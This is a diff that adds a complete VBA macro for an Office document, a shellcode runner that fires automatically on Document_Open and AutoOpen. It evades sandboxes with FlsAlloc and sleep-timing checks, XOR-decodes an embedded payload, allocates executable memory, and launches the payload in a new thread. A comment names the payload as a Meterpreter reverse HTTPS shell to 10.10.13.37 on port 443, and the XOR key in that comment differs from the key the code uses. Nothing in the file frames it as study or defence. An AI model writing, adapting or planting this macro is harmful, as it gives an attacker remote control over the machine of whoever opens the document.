@@ -1,0 +1,73 @@
+Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
+Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr
+Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
+Private Declare PtrSafe Function Sleep Lib "kernel32" (ByVal mili As Long) As Long
+Private Declare PtrSafe Function FlsAlloc Lib "kernel32" (ByVal lpCallback As LongPtr) As Long
+
+Sub Document_Open()
+  ShellcodeRunner
+End Sub
+
+Sub AutoOpen()
+  ShellcodeRunner
+End Sub
+
+Function ShellcodeRunner()
+  Dim buf As Variant
+  Dim tmp As LongPtr
+  Dim addr As LongPtr
+  Dim counter As Long
+  Dim data As Long
+  Dim res As Long
+  Dim dream As Integer
+  Dim before As Date
+  Dim poxor As String
+  Dim j As Integer
+  
+  'Sandbox?
+  If IsNull(FlsAlloc(tmp)) Then
+    Exit Function
+  End If
+
+  ' Sleep check
+  dream = Int((1500 * 4) + 2000)
+  before = Now()
+  Sleep (dream)
+  If DateDiff("s", before, Now()) < dream / 1000 Then
+    Exit Function
+  End If
+
+  ' msfvenom -p windows/meterpreter/reverse_https LHOST=10.10.13.37 LPORT=443 EXITFUNC=thread -f vbapplication --encrypt xor --encrypt-key 'xor_key!'
+  buf = Array(157, 138, 225, 49, 50, 51, 1, 235, 134, 0, 242, 87, 234, 50, 83, 186, 96, 63, 234, 48, 119, 186, 64, 27, 110, 213, 41, 23, 3, 204, 205, 94, 2, 77, 48, 31, 65, 163, 172, 60, 51, 244, 131, 144, 49, 102, 185, 97, 113, 233, 41, 13, 185, 127, 112, 26, 128, 121, 51, 226, 48, 233, 58, 17, 51, 224, 234, 43, 123, 210, 8, 122, 234, 86, 232, 48, 228, 2, 158, 206, 162, _
+254, 63, 50, 166, 90, 131, 68, 196, 48, 28, 154, 88, 76, 22, 70, 133, 58, 232, 105, 22, 50, 178, 4, 232, 61, 121, 184, 57, 126, 98, 226, 185, 55, 234, 99, 179, 184, 118, 23, 69, 57, 56, 80, 107, 105, 48, 157, 131, 110, 109, 105, 234, 112, 136, 188, 111, 91, 82, 80, 99, 49, 90, 68, 18, 80, 60, 101, 90, 127, 22, 68, 100, 206, 231, 139, 241, 99, 99, 49, 27, _
+247, 53, 50, 11, 24, 178, 88, 97, 157, 182, 97, 98, 99, 49, 34, 51, 113, 98, 91, 139, 109, 188, 209, 205, 230, 246, 8, 102, 89, 242, 155, 76, 190, 11, 51, 50, 44, 241, 235, 133, 91, 34, 101, 54, 10, 250, 148, 70, 82, 158, 183, 230, 241, 70, 63, 158, 44, 107, 68, 222, 91, 145, 215, 193, 103, 205, 230, 9, 1, 14, 85, 50, 186, 130, 53, 52, 102, 3, 197, 11, _
+112, 58, 103, 208, 206, 7, 165, 39, 21, 14, 50, 96, 239, 39, 21, 34, 245, 97, 38, 55, 97, 100, 101, 55, 36, 53, 127, 100, 101, 50, 52, 11, 72, 254, 12, 231, 157, 182, 184, 210, 125, 55, 36, 156, 1, 90, 59, 230, 127, 3, 206, 231, 136, 129, 127, 73, 59, 90, 149, 244, 223, 254, 206, 231, 15, 103, 30, 105, 177, 201, 211, 20, 103, 216, 118, 33, 65, 14, 8, 99, _
+98, 205, 230)
+
+ 
+  poxor = "abc123"
+  j = 1
+  For i = 0 To UBound(buf)
+    buf(i) = buf(i) Xor Asc(Left(Mid(poxor, j), 1))
+    j = j + 1
+    If j > Len(poxor) Then
+        j = 1
+    End If
+    
+  Next i
+
+  addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
+
+  For counter = LBound(buf) To UBound(buf)
+    data = buf(counter)
+    res = RtlMoveMemory(addr + counter, data, 1)
+  Next counter
+
+  res = CreateThread(0, 0, addr, 0, 0, 0)
+End Function
+
+
+
+
+
+
